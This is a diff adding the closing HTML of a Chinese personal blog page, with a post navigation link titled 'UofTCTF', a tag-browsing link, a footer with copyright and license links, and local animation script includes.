+      <span class="post_nav_title">UofTCTF</span>
+    </a>
+    
+  </nav>
+
+  <p class="post_back">
+    <a href="/tags/" data-magnetic data-stroke data-cursor="全部文章">
+      <svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4.6 12h14.2"/><path d="m13 6.2 5.8 5.8-5.8 5.8"/></svg><span>按标签浏览全部文章</span>
+    </a>
+  </p>
+</article>
+
+    </main>
+
+    <footer class="site_footer">
+  <p class="site_footer_copy">
+    &copy; 2026 祈染安 &middot; 安的角落
+  </p>
+  <p class="site_footer_license">
+    <a href="/about/" data-cursor="关于">关于</a>
+    &middot;
+    <a href="/feed.xml" data-cursor="订阅">RSS</a>
+    &middot;
+    <a target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="license noopener">CC BY-NC 4.0</a>
+  </p>
+</footer>
+
+
+    <!-- 动画依赖全部本地化，不依赖任何 CDN -->
+    <script src="/js/vendor/gsap.min.js"></script>
+    <script src="/js/vendor/ScrollTrigger.min.js"></script>
+    <script src="/js/vendor/CustomEase.min.js"></script>
+    <script src="/js/vendor/SplitText.min.js"></script>
+    <script src="/js/vendor/lenis.min.js"></script>
+    <script src="/js/frontend.js"></script>
+  </body>
+</html>
